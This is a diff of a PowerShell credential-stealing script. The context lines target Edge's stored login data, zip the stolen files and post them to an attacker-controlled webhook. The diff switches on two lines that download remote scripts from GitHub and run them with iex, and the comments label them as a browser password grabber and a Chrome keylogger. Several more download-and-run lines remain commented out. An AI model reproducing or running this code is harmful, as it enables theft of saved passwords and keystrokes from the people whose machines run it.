@@ -340,9 +340,9 @@ if (test-path "$env:localappdata/Microsoft/Edge/User Data/Default/Login Data") {
 compress-archive -path "$outpath" -destinationpath "$outpath.zip" -force
 curl.exe -k -X POST -F 'payload_json={\"username\": \"BinBot\", \"content\": \"\", \"avatar_url\": \"https://cdn.pixabay.com/animation/2023/09/07/21/54/21-54-00-174_512.gif\"}' -F "file=@$env:temp\B1555.005.zip" $hookurl
 # Grab pass browserpassview
-# Invoke-RestMethod https://raw.githubusercontent.com/bindas88/sni/main/WbGrab.ps1 | iex
+ Invoke-RestMethod https://raw.githubusercontent.com/bindas88/sni/main/WbGrab.ps1 | iex
 # keylogchrome
-# Invoke-RestMethod https://raw.githubusercontent.com/bindas88/sni/main/main.ps1 | iex
+ Invoke-RestMethod https://raw.githubusercontent.com/bindas88/sni/main/main.ps1 | iex
 # Invoke-RestMethod https://raw.githubusercontent.com/bindas88/rem/main/Screen-Party.ps1 | iex
 # Invoke-RestMethod https://raw.githubusercontent.com/Nitro4542/getjumpscared/main/scripts/downloader.ps1 | iex
 Sleep 10
